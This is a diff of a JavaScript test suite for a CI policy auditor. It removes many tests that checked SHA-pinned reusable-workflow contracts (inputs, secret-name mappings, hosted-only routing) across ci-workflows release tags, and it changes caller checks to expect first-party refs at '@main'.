-    [`${workflowPath}@${REPINE_LANE_SHA_V0_59_0}`],
-  );
-});
-
-// v0.59.1 keeps both review interfaces: inputs, secrets and permissions are
-// unchanged, and only the claude-code-action pin (ci-workflows#838) and the
-// findings count (ci-workflows#848) move, so each v0.55.0 entry carries
-// forward verbatim.
-test("both review contracts at the v0.59.1 tag copy their v0.55.0 entries forward verbatim", () => {
-  const contracts = BASE_POLICY.approvedReusableWorkflowContracts;
-  const reusables = ["pr-review", "pr-review-security"];
-  for (const reusable of reusables) {
-    const workflowPath = `melodic-software/ci-workflows/.github/workflows/${reusable}.yml`;
-    const previous = contracts[`${workflowPath}@${REPINE_LANE_SHA_V0_55_0}`];
-    assert.ok(previous, `expected a v0.55.0 contract for ${reusable}`);
-    assert.deepEqual(
-      contracts[`${workflowPath}@${REPINE_LANE_SHA_V0_59_1}`],
-      previous,
-      `${reusable} at the v0.59.1 tag is not a verbatim copy of its v0.55.0 entry`,
-    );
-  }
-  assert.equal(
-    Object.keys(contracts).filter((key) => key.endsWith(`@${REPINE_LANE_SHA_V0_59_1}`)).length,
-    reusables.length,
-  );
-});
-
-// v0.60.0 keeps the intake-triage and both review interfaces: the review
-// workflow files are byte-identical, intake-triage changes only steps
-// (ci-workflows#854), and the commit-relative actions move (ci-workflows#849,
-// ci-workflows#853), so each entry carries its previous contract forward
-// verbatim.
-test("the intake-triage and review contracts at the v0.60.0 tag copy their previous entries forward verbatim", () => {
-  const contracts = BASE_POLICY.approvedReusableWorkflowContracts;
-  const previousShas = {
-    "intake-triage": REPINE_LANE_SHA_V0_58_0,
-    "pr-review": REPINE_LANE_SHA_V0_59_1,
-    "pr-review-security": REPINE_LANE_SHA_V0_59_1,
-  };
-  for (const [reusable, previousSha] of Object.entries(previousShas)) {
-    const workflowPath = `melodic-software/ci-workflows/.github/workflows/${reusable}.yml`;
-    const previous = contracts[`${workflowPath}@${previousSha}`];
-    assert.ok(previous, `expected a ${previousSha} contract for ${reusable}`);
-    assert.deepEqual(
-      contracts[`${workflowPath}@${REPINE_LANE_SHA_V0_60_0}`],
-      previous,
-      `${reusable} at the v0.60.0 tag is not a verbatim copy of its previous entry`,
-    );
-  }
-  assert.equal(
-    Object.keys(contracts).filter((key) => key.endsWith(`@${REPINE_LANE_SHA_V0_60_0}`)).length,
-    Object.keys(previousShas).length,
-  );
-});
-
-// v0.61.0 keeps the intake-triage and both review caller contracts:
-// intake-triage changes only steps and job outputs (ci-workflows#856), the
-// review workflows add two optional credential-name inputs callers do not
-// pass, and the commit-relative actions move (ci-workflows#856,
-// ci-workflows#857), so each entry carries its v0.60.0 contract forward
-// verbatim.
-test("the intake-triage and review contracts at the v0.61.0 tag copy their v0.60.0 entries forward verbatim", () => {
-  const contracts = BASE_POLICY.approvedReusableWorkflowContracts;
-  const reusables = ["intake-triage", "pr-review", "pr-review-security"];
-  for (const reusable of reusables) {
-    const workflowPath = `melodic-software/ci-workflows/.github/workflows/${reusable}.yml`;
-    const previous = contracts[`${workflowPath}@${REPINE_LANE_SHA_V0_60_0}`];
-    assert.ok(previous, `expected a v0.60.0 contract for ${reusable}`);
-    assert.deepEqual(
-      contracts[`${workflowPath}@${REPINE_LANE_SHA_V0_61_0}`],
-      previous,
-      `${reusable} at the v0.61.0 tag is not a verbatim copy of its v0.60.0 entry`,
-    );
-  }
-  assert.equal(
-    Object.keys(contracts).filter((key) => key.endsWith(`@${REPINE_LANE_SHA_V0_61_0}`)).length,
-    reusables.length,
-  );
-});
-
-// v0.62.0 changes only the subprocess isolation install step of the three
-// workflows (ci-workflows#858); interfaces and commit-relative actions match
-// v0.61.0, so each entry carries its v0.61.0 contract forward verbatim.
-test("the intake-triage and review contracts at the v0.62.0 tag copy their v0.61.0 entries forward verbatim", () => {
-  const contracts = BASE_POLICY.approvedReusableWorkflowContracts;
-  const reusables = ["intake-triage", "pr-review", "pr-review-security"];
-  for (const reusable of reusables) {
-    const workflowPath = `melodic-software/ci-workflows/.github/workflows/${reusable}.yml`;
-    const previous = contracts[`${workflowPath}@${REPINE_LANE_SHA_V0_61_0}`];
-    assert.ok(previous, `expected a v0.61.0 contract for ${reusable}`);
-    assert.deepEqual(
-      contracts[`${workflowPath}@${REPINE_LANE_SHA_V0_62_0}`],
-      previous,
-      `${reusable} at the v0.62.0 tag is not a verbatim copy of its v0.61.0 entry`,
-    );
-  }
-  assert.equal(
-    Object.keys(contracts).filter((key) => key.endsWith(`@${REPINE_LANE_SHA_V0_62_0}`)).length,
-    reusables.length,
-  );
-});
-
-// v0.63.0 adds pr-review-cli (ci-workflows#862), a review lane with no runner
-// input whose every job runs on ubuntu-24.04. Its one contract is hosted-only
-// and admits the reviews role's API key and subscription token.
-test("the pr-review-cli contract at the v0.63.0 tag is hosted-only and admits the reviews key and token", () => {
-  const contracts = BASE_POLICY.approvedReusableWorkflowContracts;
-  const sha = "8778094736e414233110f3e0d6d9948628ba77b5";
-  assert.deepEqual(
-    contracts[`melodic-software/ci-workflows/.github/workflows/pr-review-cli.yml@${sha}`],
-    {
-      routing: "hosted-only",
-      fixedRunsOn: ["ubuntu-24.04"],
-      allowedInputs: [
-        "lane",
-        "publish",
-        "role",
-        "model-args",
-        "allowed-bot-sender-ids",
-        "allowed-author-ids",
-        "docs-only-paths",
-        "incremental-review",
-        "cli-version",
-      ],
-      allowedSecrets: {
-        CLAUDE_API_KEY: `\${{ secrets.REVIEWS_CLAUDE_API_KEY }}`,
-        CLAUDE_CODE_OAUTH_TOKEN: `\${{ secrets.REVIEWS_CLAUDE_CODE_OAUTH_TOKEN }}`,
-      },
-    },
-  );
-  assert.equal(Object.keys(contracts).filter((key) => key.endsWith(`@${sha}`)).length, 1);
-});
-
-// v0.63.1 changes only pr-review-cli's publish step (ci-workflows#865), so its
-// contract copies the v0.63.0 entry forward verbatim.
-test("the pr-review-cli contract at the v0.63.1 tag copies its v0.63.0 entry forward verbatim", () => {
-  const contracts = BASE_POLICY.approvedReusableWorkflowContracts;
-  const key = (sha) => `melodic-software/ci-workflows/.github/workflows/pr-review-cli.yml@${sha}`;
-  const sha = "83b739f625b501ad40c65dee7168d836883195e1";
-  assert.deepEqual(contracts[key(sha)], contracts[key("8778094736e414233110f3e0d6d9948628ba77b5")]);
-  assert.equal(Object.keys(contracts).filter((k) => k.endsWith(`@${sha}`)).length, 1);
-});
-
-// v0.64.0 adds pr-review-cli's optional hold-label and hold-paths inputs
-// (ci-workflows#864); everything else copies forward from v0.63.1.
-test("the pr-review-cli contract at the v0.64.0 tag adds the hold inputs to its v0.63.1 entry", () => {
-  const contracts = BASE_POLICY.approvedReusableWorkflowContracts;
-  const key = (sha) => `melodic-software/ci-workflows/.github/workflows/pr-review-cli.yml@${sha}`;
-  const sha = "4edeccd87cf60ef539ce5109b78454217d5f2049";
-  const previous = contracts[key("83b739f625b501ad40c65dee7168d836883195e1")];
-  assert.deepEqual(contracts[key(sha)], {
-    ...previous,
-    allowedInputs: [...previous.allowedInputs, "hold-label", "hold-paths"],
-  });
-  assert.equal(Object.keys(contracts).filter((k) => k.endsWith(`@${sha}`)).length, 1);
-});
-
-// v0.64.1 changes only pr-review-cli's extract and publish steps and its
-// continue-on-error wiring (ci-workflows#868), so its contract copies the
-// v0.64.0 entry forward verbatim.
-test("the pr-review-cli contract at the v0.64.1 tag copies its v0.64.0 entry forward verbatim", () => {
-  const contracts = BASE_POLICY.approvedReusableWorkflowContracts;
-  const key = (sha) => `melodic-software/ci-workflows/.github/workflows/pr-review-cli.yml@${sha}`;
-  const sha = "9aca743c4ed9aaf7870288a36586c3994e9321e4";
-  assert.deepEqual(contracts[key(sha)], contracts[key("4edeccd87cf60ef539ce5109b78454217d5f2049")]);
-  assert.equal(Object.keys(contracts).filter((k) => k.endsWith(`@${sha}`)).length, 1);
-});
-
-// v0.64.2 changes only how pr-review-cli's steps read the GitHub API
-// (ci-workflows#869), so its contract copies the v0.64.1 entry forward
-// verbatim.
-test("the pr-review-cli contract at the v0.64.2 tag copies its v0.64.1 entry forward verbatim", () => {
-  const contracts = BASE_POLICY.approvedReusableWorkflowContracts;
-  const key = (sha) => `melodic-software/ci-workflows/.github/workflows/pr-review-cli.yml@${sha}`;
-  const sha = "6d6cb798e7cb7560a0f9327d8a22398961c23b31";
-  assert.deepEqual(contracts[key(sha)], contracts[key("9aca743c4ed9aaf7870288a36586c3994e9321e4")]);
-  assert.equal(Object.keys(contracts).filter((k) => k.endsWith(`@${sha}`)).length, 1);
-});
-
-// v0.65.0 changes only report-lane-outcome's classify.cjs, which adds the
-// optional costUsd field to the lane-outcome record (ci-workflows#872);
-// intake-triage.yml and pr-review-cli.yml reach it through $/ and are
-// unchanged, so both contracts copy forward verbatim.
-test("the intake-triage and pr-review-cli contracts at the v0.65.0 tag copy their prior entries forward verbatim", () => {
-  const contracts = BASE_POLICY.approvedReusableWorkflowContracts;
-  const key = (workflow, sha) =>
-    `melodic-software/ci-workflows/.github/workflows/${workflow}.yml@${sha}`;
-  const sha = "d02b8697e092705153f0996549b05f95a446bb52";
-  assert.deepEqual(
-    contracts[key("intake-triage", sha)],
-    contracts[key("intake-triage", "2fe38c031867900824c164e33a140a335ed9ecf0")],
-  );
-  assert.deepEqual(
-    contracts[key("pr-review-cli", sha)],
-    contracts[key("pr-review-cli", "6d6cb798e7cb7560a0f9327d8a22398961c23b31")],
-  );
-  assert.equal(Object.keys(contracts).filter((k) => k.endsWith(`@${sha}`)).length, 2);
-});
-
-// b0ecc27, one docs commit past v0.65.0 with no .github change, moves
-// intake-triage onto the intake funding role: the v0.65.0 entry with role
-// intake and INTAKE_* secrets. The v0.65.0 entry stays until
-// claude-code-plugins repins its caller.
-test("the intake-triage contract at b0ecc27 is the v0.65.0 entry on the intake role", () => {
-  const contracts = BASE_POLICY.approvedReusableWorkflowContracts;
-  const key = (sha) => `melodic-software/ci-workflows/.github/workflows/intake-triage.yml@${sha}`;
-  const sha = "b0ecc273abe492d12f2efa98ee4741a84c219ed2";
-  const prior = contracts[key("d02b8697e092705153f0996549b05f95a446bb52")];
-  assert.equal(prior.role, "automations");
-  assert.deepEqual(contracts[key(sha)], {
-    ...prior,
-    role: "intake",
-    allowedSecrets: {
-      CLAUDE_API_KEY: `\${{ secrets.INTAKE_CLAUDE_API_KEY }}`,
-      CLAUDE_CODE_OAUTH_TOKEN: `\${{ secrets.INTAKE_CLAUDE_CODE_OAUTH_TOKEN }}`,
-    },
-  });
-  assert.equal(Object.keys(contracts).filter((k) => k.endsWith(`@${sha}`)).length, 1);
-});
-
-// v0.65.1 changes only pr-review-cli.yml's internals: the review reaches the
-// status job as an artifact instead of a job output (ci-workflows#874). Its
-// inputs, secrets and runner are unchanged, so the contract copies forward.
-test("the pr-review-cli contract at the v0.65.1 tag copies its v0.65.0 entry forward verbatim", () => {
-  const contracts = BASE_POLICY.approvedReusableWorkflowContracts;
-  const key = (sha) => `melodic-software/ci-workflows/.github/workflows/pr-review-cli.yml@${sha}`;
-  const sha = "b49ac366bb3426039363a6927c41512e44533808";
-  assert.deepEqual(contracts[key(sha)], contracts[key("d02b8697e092705153f0996549b05f95a446bb52")]);
-  assert.equal(Object.keys(contracts).filter((k) => k.endsWith(`@${sha}`)).length, 1);
-});
-
-// v0.65.2 changes only pr-review-cli.yml's internals: each job reports its
-// job-token api budget, and the hold step skips a cost re-hold the owner
-// already decided (ci-workflows#875). Its inputs, secrets and runner are
-// unchanged, so the contract copies forward.
-test("the pr-review-cli contract at the v0.65.2 tag copies its v0.65.1 entry forward verbatim", () => {
-  const contracts = BASE_POLICY.approvedReusableWorkflowContracts;
-  const key = (sha) => `melodic-software/ci-workflows/.github/workflows/pr-review-cli.yml@${sha}`;
-  const sha = "e7f935fc799fc9c78f1dc52646e8bbd54823502a";
-  assert.deepEqual(contracts[key(sha)], contracts[key("b49ac366bb3426039363a6927c41512e44533808")]);
-  assert.equal(Object.keys(contracts).filter((k) => k.endsWith(`@${sha}`)).length, 1);
-});
-
-// v0.65.3 changes only the hold step's cost-decision matching
-// (ci-workflows#876). Inputs, secrets and runner are unchanged, so the
-// contract copies forward.
-test("the pr-review-cli contract at the v0.65.3 tag copies its v0.65.2 entry forward verbatim", () => {
-  const contracts = BASE_POLICY.approvedReusableWorkflowContracts;
-  const key = (sha) => `melodic-software/ci-workflows/.github/workflows/pr-review-cli.yml@${sha}`;
-  const sha = "f133c6651f866845e18595d26cf59d4043b5b642";
-  assert.deepEqual(contracts[key(sha)], contracts[key("e7f935fc799fc9c78f1dc52646e8bbd54823502a")]);
-  assert.equal(Object.keys(contracts).filter((k) => k.endsWith(`@${sha}`)).length, 1);
-});
-
-// v0.65.4 changes only the hold step's cost-decision carry-over
-// (ci-workflows#877): it adds BASE_REF to a step env. Inputs, secrets and
-// runner are unchanged, so the contract copies forward.
-test("the pr-review-cli contract at the v0.65.4 tag copies its v0.65.3 entry forward verbatim", () => {
-  const contracts = BASE_POLICY.approvedReusableWorkflowContracts;
-  const key = (sha) => `melodic-software/ci-workflows/.github/workflows/pr-review-cli.yml@${sha}`;
-  const sha = "31b44f3ffc7f208fb281dd2b64decce67c53d316";
-  assert.deepEqual(contracts[key(sha)], contracts[key("f133c6651f866845e18595d26cf59d4043b5b642")]);
-  assert.equal(Object.keys(contracts).filter((k) => k.endsWith(`@${sha}`)).length, 1);
-});
-
-// v0.65.5 changes only the hold step's cost-decision carry-over
-// (ci-workflows#878): a decision carries only from an unedited hold marker.
-// Inputs, secrets and runner are unchanged, so the contract copies forward.
-test("the pr-review-cli contract at the v0.65.5 tag copies its v0.65.4 entry forward verbatim", () => {
-  const contracts = BASE_POLICY.approvedReusableWorkflowContracts;
-  const key = (sha) => `melodic-software/ci-workflows/.github/workflows/pr-review-cli.yml@${sha}`;
-  const sha = "f1096608192c54cfb3dc252e36670e6f86700b9b";
-  assert.deepEqual(contracts[key(sha)], contracts[key("31b44f3ffc7f208fb281dd2b64decce67c53d316")]);
-  assert.equal(Object.keys(contracts).filter((k) => k.endsWith(`@${sha}`)).length, 1);
-});
-
-// v0.65.6 changes only the hold step's cost-decision carry-over
-// (ci-workflows#879): a decision carries no further once a pull request
-// comment was deleted since its hold marker. Inputs, secrets and runner are
-// unchanged, so the contract copies forward.
-test("the pr-review-cli contract at the v0.65.6 tag copies its v0.65.5 entry forward verbatim", () => {
-  const contracts = BASE_POLICY.approvedReusableWorkflowContracts;
-  const key = (sha) => `melodic-software/ci-workflows/.github/workflows/pr-review-cli.yml@${sha}`;
-  const sha = "914264587c35692c15e05c965103426eec18d1f0";
-  assert.deepEqual(contracts[key(sha)], contracts[key("f1096608192c54cfb3dc252e36670e6f86700b9b")]);
-  assert.equal(Object.keys(contracts).filter((k) => k.endsWith(`@${sha}`)).length, 1);
-});
-
-// v0.65.7 changes only what the hold step and the prompt do with holds
-// (ci-workflows#880): hold-paths becomes extra security scrutiny in the
-// prompt, not a hold, and a cost hold needs a real charge. The hold-paths
-// input stays, and inputs, secrets and runner are unchanged, so the contract
-// copies forward.
-test("the pr-review-cli contract at the v0.65.7 tag copies its v0.65.6 entry forward verbatim", () => {
-  const contracts = BASE_POLICY.approvedReusableWorkflowContracts;
-  const key = (sha) => `melodic-software/ci-workflows/.github/workflows/pr-review-cli.yml@${sha}`;
-  const sha = "4c531cea137f5cbb38d4c132dbfa6e38f76fba7d";
-  assert.deepEqual(contracts[key(sha)], contracts[key("914264587c35692c15e05c965103426eec18d1f0")]);
-  assert.equal(Object.keys(contracts).filter((k) => k.endsWith(`@${sha}`)).length, 1);
-});
-
-// v0.65.8 adds the check-key-credit job (ci-workflows#882), which skips the
-// key job while the key's recent credit stop is inside key-credit-window-hours.
-// Callers pass no new input and grant actions: read on the calling job, which
-// the contract does not record; inputs, secrets and runner are unchanged, so
-// the contract copies forward.
-test("the pr-review-cli contract at the v0.65.8 tag copies its v0.65.7 entry forward verbatim", () => {
-  const contracts = BASE_POLICY.approvedReusableWorkflowContracts;
-  const key = (sha) => `melodic-software/ci-workflows/.github/workflows/pr-review-cli.yml@${sha}`;
-  const sha = "4f79cc9244498ae856504cf74aeeb05dcc9c6b43";
-  assert.deepEqual(contracts[key(sha)], contracts[key("4c531cea137f5cbb38d4c132dbfa6e38f76fba7d")]);
-  assert.equal(Object.keys(contracts).filter((k) => k.endsWith(`@${sha}`)).length, 1);
-});
-
-// v0.65.9 writes the full diff with git diff --text (ci-workflows#884), so a
-// head .gitattributes or a NUL byte cannot hide a file's text from the review
-// model. Inputs, secrets and runner are unchanged, so the contract copies
-// forward.
-test("the pr-review-cli contract at the v0.65.9 tag copies its v0.65.8 entry forward verbatim", () => {
-  const contracts = BASE_POLICY.approvedReusableWorkflowContracts;
-  const key = (sha) => `melodic-software/ci-workflows/.github/workflows/pr-review-cli.yml@${sha}`;
-  const sha = "4fbceb4b75ffd568dfa5db31de0d0e753c0c64e6";
-  assert.deepEqual(contracts[key(sha)], contracts[key("4f79cc9244498ae856504cf74aeeb05dcc9c6b43")]);
-  assert.equal(Object.keys(contracts).filter((k) => k.endsWith(`@${sha}`)).length, 1);
-});
-
-// v0.65.10 keeps an existing Issue Type, applies nothing on a permission
-// denial over an otherwise clean triage, and adds the triage-deferred output
-// (ci-workflows#887). Inputs, secrets and job permissions are unchanged, so
-// the intake-role contract at b0ecc27 copies forward.
-test("the intake-triage contract at the v0.65.10 tag copies its b0ecc27 entry forward verbatim", () => {
-  const contracts = BASE_POLICY.approvedReusableWorkflowContracts;
-  const key = (sha) => `melodic-software/ci-workflows/.github/workflows/intake-triage.yml@${sha}`;
-  const sha = "215cec5c362f953f8b6196effb04451696c3f970";
-  assert.deepEqual(contracts[key(sha)], contracts[key("b0ecc273abe492d12f2efa98ee4741a84c219ed2")]);
-  assert.equal(Object.keys(contracts).filter((k) => k.endsWith(`@${sha}`)).length, 1);
-});
-
-// v0.65.11 adds the leg's token usage and rate-limit windows to the
-// lane-outcome record (ci-workflows#889). Inputs, secrets and job permissions
-// are unchanged, so both lane contracts copy forward.
-test("the intake-triage and pr-review-cli contracts at the v0.65.11 tag copy their prior entries forward verbatim", () => {
-  const contracts = BASE_POLICY.approvedReusableWorkflowContracts;
-  const key = (wf, sha) => `melodic-software/ci-workflows/.github/workflows/${wf}@${sha}`;
-  const sha = "e5167fc29d948ab7d0923cf62f5ea9eeeef8e9e8";
-  assert.deepEqual(
-    contracts[key("intake-triage.yml", sha)],
-    contracts[key("intake-triage.yml", "215cec5c362f953f8b6196effb04451696c3f970")],
-  );
-  assert.deepEqual(
-    contracts[key("pr-review-cli.yml", sha)],
-    contracts[key("pr-review-cli.yml", "4fbceb4b75ffd568dfa5db31de0d0e753c0c64e6")],
-  );
-  assert.equal(Object.keys(contracts).filter((k) => k.endsWith(`@${sha}`)).length, 2);
-});
-
-// v0.65.12 adds the optional FALLBACK_CLAUDE_CODE_OAUTH_TOKEN workflow_call
-// secret to both lanes (ci-workflows#890): the central fallback subscription's
-// org secret, mapped under its own name for every role. Inputs and job
-// permissions are unchanged.
-test("the intake-triage and pr-review-cli contracts at the v0.65.12 tag add only the fallback secret to their v0.65.11 entries", () => {
-  const contracts = BASE_POLICY.approvedReusableWorkflowContracts;
-  const key = (wf, sha) => `melodic-software/ci-workflows/.github/workflows/${wf}@${sha}`;
-  const sha = "78ee7a2609a84b0073c5e09dfe3bc59613e689dc";
-  const previous = "e5167fc29d948ab7d0923cf62f5ea9eeeef8e9e8";
-  for (const wf of ["intake-triage.yml", "pr-review-cli.yml"]) {
-    const prior = contracts[key(wf, previous)];
-    assert.deepEqual(contracts[key(wf, sha)], {
-      ...prior,
-      allowedSecrets: {
-        ...prior.allowedSecrets,
-        FALLBACK_CLAUDE_CODE_OAUTH_TOKEN: `\${{ secrets.FALLBACK_CLAUDE_CODE_OAUTH_TOKEN }}`,
-      },
-    });
-  }
-  assert.equal(Object.keys(contracts).filter((k) => k.endsWith(`@${sha}`)).length, 2);
-});
-
-// v0.65.13 fixes the pr-review-cli status job's token-leg result output
-// (ci-workflows#892): no input, secret or permission changes, so both
-// entries copy v0.65.12 forward unchanged.
-test("the intake-triage and pr-review-cli contracts at the v0.65.13 tag copy their v0.65.12 entries unchanged", () => {
-  const contracts = BASE_POLICY.approvedReusableWorkflowContracts;
-  const key = (wf, sha) => `melodic-software/ci-workflows/.github/workflows/${wf}@${sha}`;
-  const sha = "ba7af78d291f10bd75651857a0db2357c23df0fe";
-  const previous = "78ee7a2609a84b0073c5e09dfe3bc59613e689dc";
-  for (const wf of ["intake-triage.yml", "pr-review-cli.yml"]) {
-    assert.ok(contracts[key(wf, previous)], wf);
-    assert.deepEqual(contracts[key(wf, sha)], contracts[key(wf, previous)], wf);
-  }
-  assert.equal(Object.keys(contracts).filter((k) => k.endsWith(`@${sha}`)).length, 2);
-});
-
-// v0.65.14 reports a failed "Isolate the runner" install as install-failed
-// (ci-workflows#893): no input, secret or permission changes, so the
-// pr-review-cli entry copies v0.65.13 forward unchanged.
-test("the pr-review-cli contract at the v0.65.14 tag copies its v0.65.13 entry unchanged", () => {
-  const contracts = BASE_POLICY.approvedReusableWorkflowContracts;
-  const key = (sha) => `melodic-software/ci-workflows/.github/workflows/pr-review-cli.yml@${sha}`;
-  const sha = "3180217076b19bbdfccc43026c7f91c604da673d";
-  const previous = "ba7af78d291f10bd75651857a0db2357c23df0fe";
-  assert.ok(contracts[key(previous)]);
-  assert.deepEqual(contracts[key(sha)], contracts[key(previous)]);
-});
-
-// v0.66.1's status job adds actions: read and checks: read (ci-workflows#904),
-// read-only scopes a hosted-only contract does not record; inputs, secrets and
-// routing are unchanged, so the entry copies v0.65.14 forward.
-test("the pr-review-cli contract at the v0.66.1 tag copies its v0.65.14 entry unchanged", () => {
-  const contracts = BASE_POLICY.approvedReusableWorkflowContracts;
-  const key = (sha) => `melodic-software/ci-workflows/.github/workflows/pr-review-cli.yml@${sha}`;
-  const sha = "20a822d73b6e2d7e21d48e609a01b427e0e161e7";
-  const previous = "3180217076b19bbdfccc43026c7f91c604da673d";
-  assert.ok(contracts[key(previous)]);
-  assert.deepEqual(contracts[key(sha)], contracts[key(previous)]);
-});
-
-// At v0.65.14 the claude-lanes re-pin leaves v0.55.0. Both review workflows
-// differ from v0.62.0 only in the isolation install step's id and its
-// install-failed class; maintenance-sync-standards is byte-identical to
-// v0.55.0. No interface widens, so each entry is its newest predecessor verbatim.
-test("the claude-lanes contracts at the v0.65.14 tag copy their previous entries forward verbatim", () => {
-  const contracts = BASE_POLICY.approvedReusableWorkflowContracts;
-  const previousShas = {
-    "pr-review": REPINE_LANE_SHA_V0_62_0,
-    "pr-review-security": REPINE_LANE_SHA_V0_62_0,
-    "maintenance-sync-standards": REPINE_LANE_SHA_V0_55_0,
-  };
-  for (const [reusable, previousSha] of Object.entries(previousShas)) {
-    const workflowPath = `melodic-software/ci-workflows/.github/workflows/${reusable}.yml`;
-    const previous = contracts[`${workflowPath}@${previousSha}`];
-    assert.ok(previous, `expected a ${previousSha} contract for ${reusable}`);
-    assert.deepEqual(
-      contracts[`${workflowPath}@${REPINE_LANE_SHA_V0_65_14}`],
-      previous,
-      `${reusable} at the v0.65.14 tag is not a verbatim copy of its previous entry`,
-    );
-  }
-});
-
-// v0.65.15 makes priority labels exclusive in the intake-triage apply step
-// (ci-workflows#896): no input, secret or permission changes, so the
-// intake-triage entry copies v0.65.13 forward unchanged.
-test("the intake-triage contract at the v0.65.15 tag copies its v0.65.13 entry unchanged", () => {
-  const contracts = BASE_POLICY.approvedReusableWorkflowContracts;
-  const key = (sha) => `melodic-software/ci-workflows/.github/workflows/intake-triage.yml@${sha}`;
-  const sha = "30b251532b2e9f7e0c4215e1dee5be0d3c688743";
-  const previous = "ba7af78d291f10bd75651857a0db2357c23df0fe";
-  assert.ok(contracts[key(previous)]);
-  assert.deepEqual(contracts[key(sha)], contracts[key(previous)]);
-  assert.equal(Object.keys(contracts).filter((k) => k.endsWith(`@${sha}`)).length, 1);
-});
-
-// Convergence as a property, never as a hardcoded SHA. The daily
-// claude-lanes-repin lane rewrites these components on ci-workflows releases,
-// and a test naming one revision would go red by construction on each of its
-// pull requests while nothing was actually wrong. The lane moves a pin only
-// when the release changed its path, so the code-review and security-review
-// callers may sit on different revisions; what convergence means is that
-// every caller of one upstream path agrees on its revision. Whether that
-// revision has a reviewed contract is already proved by the registration tests
-// above that audit these same bytes against the real policy.json.
-test("the claude lane caller components pin each ci-workflows path at one revision", async () => {
-  const pinsByPath = new Map();
+// First-party refs float on main; the registration tests above audit these
+// same bytes against the real policy.json.
+test("the claude lane caller components call every ci-workflows path at @main", async () => {
   for (const { source, body } of [
     ...(await claudeLaneCallerComponents()),
     ...(await claudeLaneCallerComponents(HOSTED_LANE_DIR)),
   ]) {
-    const found = [...body.matchAll(/melodic-software\/ci-workflows\/([^@\s]+)@([0-9a-f]{40})/gu)];
-    assert.ok(found.length > 0, `${source} carries no ci-workflows pin`);
-    for (const [, workflowPath, sha] of found) {
-      pinsByPath.set(workflowPath, (pinsByPath.get(workflowPath) ?? new Set()).add(sha));
+    const found = [...body.matchAll(/melodic-software\/ci-workflows\/([^@\s]+)@(\S+)/gu)];
+    assert.ok(found.length > 0, `${source} calls no ci-workflows path`);
+    for (const [, workflowPath, ref] of found) {
+      assert.equal(ref, "main", `${source} calls ${workflowPath} at @${ref}, not @main`);
     }
-  }
-  for (const [workflowPath, shas] of pinsByPath) {
-    assert.equal(
-      shas.size,
-      1,
-      `the claude lane caller components disagree on their ${workflowPath} pin: ${[...shas].join(", ")}`,
-    );
   }
 });
 
 // The managed-files-guard caller is the hosted-only counterpart: a fixed
-// approved hosted label, a read-only token, and a full-SHA composite-action
-// step (composite actions are not SHA-allowlisted, so no contract entry is
+// approved hosted label, a read-only token, and a first-party composite-action
+// step at @main (composite actions are not allowlisted, so no contract entry is
 // involved). It is managed for public targets and for private targets NOT
 // enrolled for local routing, and one of its managed targets
 // (claude-code-plugins) executes this gate, so the shipped bytes must audit
@@ -10450,7 +5962,7 @@ test("the managed-files-guard caller audits clean on every target that manages i
     const visibility = isPublicTarget(target) ? "public" : "private";
     const root = await consumerCarrying({ body, visibility, selfHostedCi: false });
     assert.deepEqual(
-      await auditRepository({ root, githubRepository: target, fetchImpl: HERMETIC_FETCH_STUB }),
+      await auditRepository({ root, githubRepository: target }),
       [],
       `${source} is managed for ${target} (${visibility}, hosted-only) but does not audit clean there`,
     );
@@ -10463,7 +5975,6 @@ test("the managed-files-guard caller is not admitted to a routing-enrolled priva
   const findings = await auditRepository({
     root,
     githubRepository: "melodic-software/medley",
-    fetchImpl: HERMETIC_FETCH_STUB,
   });
   assert.ok(
     findings.length > 0,
@@ -10486,7 +5997,7 @@ test("the fleet-routed managed-files-guard caller audits clean on every target t
     assert.ok(!isPublicTarget(target), `${source} is managed for ${target}, which is public`);
     const root = await consumerCarrying({ body, visibility: "private", selfHostedCi: true });
     assert.deepEqual(
-      await auditRepository({ root, githubRepository: target, fetchImpl: HERMETIC_FETCH_STUB }),
+      await auditRepository({ root, githubRepository: target }),
       [],
       `${source} is managed for ${target} (private, enrolled) but does not audit clean there`,
     );
@@ -10501,7 +6012,6 @@ test("the fleet-routed managed-files-guard caller is rejected outright on a publ
       await auditRepository({
         root,
         githubRepository: "melodic-software/claude-code-plugins",
-        fetchImpl: HERMETIC_FETCH_STUB,
       })
     ).map(({ rule }) => rule),
   );
@@ -10536,65 +6046,10 @@ test("every online link-check caller audits clean on every target that manages i
       const visibility = isPublicTarget(target) ? "public" : "private";
       const root = await consumerCarrying({ body, visibility, selfHostedCi: false });
       assert.deepEqual(
-        await auditRepository({ root, githubRepository: target, fetchImpl: HERMETIC_FETCH_STUB }),
+        await auditRepository({ root, githubRepository: target }),
         [],
         `${sources[0]} is managed for ${target} (${visibility}) but does not audit clean there`,
       );
     }
   }
-});
-
-// v0.65.16 renames the review lanes' fallback secret slot to
-// FALLBACK_CLAUDE_CODE_OAUTH_TOKEN (ci-workflows#897): both review contracts
-// add only that secret, mapped to the org secret of its own name, and the
-// fallback-credential-name input. Job permissions and routing are unchanged.
-test("the pr-review and pr-review-security contracts at the v0.65.16 tag add only the fallback secret and its name input to their v0.65.14 entries", () => {
-  const contracts = BASE_POLICY.approvedReusableWorkflowContracts;
-  const key = (wf, sha) => `melodic-software/ci-workflows/.github/workflows/${wf}@${sha}`;
-  const sha = "b26e355fe98c372f02a13d74c10a785ad8c9ce2d";
-  for (const wf of ["pr-review.yml", "pr-review-security.yml"]) {
-    const prior = contracts[key(wf, REPINE_LANE_SHA_V0_65_14)];
-    assert.ok(prior, wf);
-    assert.deepEqual(contracts[key(wf, sha)], {
-      ...prior,
-      allowedInputs: [...prior.allowedInputs, "fallback-credential-name"],
-      allowedSecrets: {
-        ...prior.allowedSecrets,
-        FALLBACK_CLAUDE_CODE_OAUTH_TOKEN: `\${{ secrets.FALLBACK_CLAUDE_CODE_OAUTH_TOKEN }}`,
-      },
-    });
-  }
-  assert.equal(Object.keys(contracts).filter((k) => k.endsWith(`@${sha}`)).length, 2);
-});
-
-// v0.66.1 adds actions: read and checks: read to the pr-review-cli status job
-// (ci-workflows#904). The hosted-only contract records no job permissions, so
-// the entry copies its v0.65.14 entry forward unchanged.
-test("the pr-review-cli contract at the v0.66.1 tag copies its v0.65.14 entry forward unchanged", () => {
-  const contracts = BASE_POLICY.approvedReusableWorkflowContracts;
-  const key = (sha) => `melodic-software/ci-workflows/.github/workflows/pr-review-cli.yml@${sha}`;
-  const sha = "20a822d73b6e2d7e21d48e609a01b427e0e161e7";
-  const prior = contracts[key(REPINE_LANE_SHA_V0_65_14)];
-  assert.ok(prior);
-  assert.deepEqual(contracts[key(sha)], prior);
-  assert.equal(contracts[key(sha)].routing, "hosted-only");
